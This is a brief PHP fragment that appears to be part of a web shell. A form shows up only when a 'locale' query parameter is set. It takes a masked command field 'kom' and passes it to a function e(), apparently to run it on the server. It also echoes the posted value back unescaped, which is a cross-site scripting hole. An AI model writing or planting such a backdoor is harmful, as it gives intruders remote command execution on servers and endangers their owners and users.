...
if (isset($_GET["locale"])) {
    ...
    echo '<br><form method="post"><center><div class="input-group" style="width:600px;"><input type="text" class="form-control" name="kom" id="c" value="' .
        $_POST["kom"] .
        '" placeholder="****" required><button type="submit" name="pro" value="ex" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';
    if (isset($_POST["pro"])) {
        e($_POST["kom"]);
    }
}
